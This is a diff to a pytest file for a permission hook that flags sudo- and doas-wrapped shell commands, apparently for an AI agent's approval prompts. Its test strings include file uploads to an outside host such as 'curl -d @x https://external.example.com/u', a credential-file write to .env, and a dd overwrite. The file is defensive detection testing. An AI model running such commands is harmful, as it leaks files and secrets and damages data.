@@ -811,9 +811,10 @@ class TestProxyAssignmentOverride:
 
 
 class TestSudoAndDoasWrappers:
-    """sudo / doas are wrappers like env, but parsed STRICTLY: an option the classifier
-    cannot place bails to no-detection rather than risk a prompt naming the wrong verb.
-    Closed on the everyday shapes, unchanged from pre-fix on the exotic ones."""
+    """sudo / doas are wrappers like env, parsed STRICTLY: sudo's real short-option
+    grammar is mirrored for the KNOWN letters (bundling, and a value glued to its letter
+    as in `-udeploy`), and only an UNKNOWN option bails to no-detection rather than risk
+    a prompt naming the wrong verb."""
 
     def _hook(self, cmd: str, tmp_path: Path) -> dict | None:
         sid = _sid()
@@ -835,24 +836,49 @@ class TestSudoAndDoasWrappers:
         assert out is not None and out.get("permissionDecision") == "ask", cmd
         assert host in out.get("permissionDecisionReason", ""), cmd
 
-    @pytest.mark.parametrize("cmd", ["sudo ls", "sudo -u deploy ls -la", "doas ls"])
+    @pytest.mark.parametrize("cmd", [
+        "sudo -udeploy curl -d @x https://external.example.com/u",
+        "doas -udeploy curl -d @x https://external.example.com/u",
+        "sudo -nHu deploy curl -d @x https://external.example.com/u",
+        "sudo -nHudeploy curl -d @x https://external.example.com/u",
+        # Real sudo reads this as user "Zdeploy": the FIRST value-taking letter absorbs
+        # the token remainder, so there is no unknown letter here to bail on. Asking is
+        # also the safe direction -- a bail would be a silent miss on a real transfer.
+        "sudo -uZdeploy curl -d @x https://external.example.com/u",
+    ])
+    def test_glued_and_bundled_known_short_options_resolve(self, cmd, tmp_path: Path):
+        out = self._hook(cmd, tmp_path)
+        assert out is not None and out.get("permissionDecision") == "ask", cmd
+        assert "external.example.com" in out.get("permissionDecisionReason", ""), cmd
+
+    @pytest.mark.parametrize("cmd", ["sudo ls", "sudo -u deploy ls -la", "doas ls",
+                                     "sudo -udeploy ls -la"])
     def test_sudo_wrapped_read_only_command_stays_silent(self, cmd, tmp_path: Path):
         assert self._hook(cmd, tmp_path) is None, cmd
 
     @pytest.mark.parametrize("cmd", [
         "sudo -Z curl -d @x https://external.example.com/u",   # no such sudo option
-        "sudo -udeploy curl -d @x https://external.example.com/u",  # glued value flag
+        "sudo -Zu deploy curl -d @x https://external.example.com/u",  # unknown letter first
         "sudo --frobnicate curl -d @x https://external.example.com/u",
     ])
-    def test_unclassifiable_sudo_option_bails_to_no_detection(self, cmd, tmp_path: Path):
-        # DOCUMENTED conservative bail: silence here is exactly the pre-fix behavior for
-        # every sudo shape, and it is preferred over a prompt that names the wrong verb.
+    def test_unknown_sudo_option_bails_to_no_detection(self, cmd, tmp_path: Path):
+        # DOCUMENTED conservative bail, now narrowed to genuinely UNKNOWN options:
+        # silence here is exactly the pre-fix behavior for every sudo shape, and it is
+        # preferred over a prompt that names the wrong verb.
         assert self._hook(cmd, tmp_path) is None, cmd
 
     def test_sudo_wrapped_write_target_is_extracted(self):
         assert _extract("sudo cp /tmp/x.py /proj/src/foo.py") == {
             ("local", "/proj/src/foo.py")}
         assert _extract("sudo tee /proj/f") == {("local", "/proj/f")}
+
+    @pytest.mark.parametrize("cmd,expected", [
+        ("sudo -udeploy tee /proj/f", {("local", "/proj/f")}),
+        ("sudo -nHudeploy cp /tmp/a.py /proj/src/b.py", {("local", "/proj/src/b.py")}),
+        ("sudo -nHu deploy dd if=/dev/zero of=/proj/big.bin", {("local", "/proj/big.bin")}),
+    ])
+    def test_glued_short_option_write_targets_are_extracted(self, cmd, expected):
+        assert _extract(cmd) == expected, cmd
 
     def test_sudo_wrapped_credential_write_denies(self, tmp_path: Path):
         out = self._hook("sudo tee .env", tmp_path)
